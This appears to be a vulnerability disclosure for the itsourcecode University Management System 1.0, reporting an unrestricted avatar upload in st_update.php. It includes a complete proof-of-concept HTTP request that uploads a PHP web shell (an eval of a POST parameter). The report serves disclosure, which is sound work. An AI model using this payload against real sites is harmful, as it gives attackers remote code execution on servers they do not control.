# Vendor

itsourcecode

# Product

University Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2022/01/University-Management-System-Project-In-PHP-Source-Code.zip

# Description
Register and log in with a student account。When visiting the /st_update.php?id=123321 page, the value corresponding to id is StudentID. You can upload an avatar file, but the page does not impose any restrictions on the uploaded files, resulting in attackers being able to directly upload PHP trojan files.

# Analysis
The /st_update.php page does not restrict the files that are uploaded.
<img width="1397" alt="image" src="https://github.com/user-attachments/assets/3247ff72-4189-4e15-8b35-8dc0aa73b6d0">

---
POST /st_update.php?id=123321 HTTP/1.1
Host: 192.168.17.24
Content-Length: 937
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.17.24
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX0kAumwGMjeexhTk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.24/st_update.php?id=123321
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: current_lang=zh; accept_cookie=true; _nss=1; PHPSESSID=48q57aq6nov1rqea73sklhccae
Connection: close

------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="personal_image"; filename="shell.php"
Content-Type: text/php

<?php eval($_POST["cmd"]);?>

------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_name"

mirage
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_email"

mirage@google.com
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_dept"

BBA
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_contact"

12343212421
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_gender"

Male
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="st_add"

hangzhou
------WebKitFormBoundaryX0kAumwGMjeexhTk
Content-Disposition: form-data; name="Update"

Update
------WebKitFormBoundaryX0kAumwGMjeexhTk--
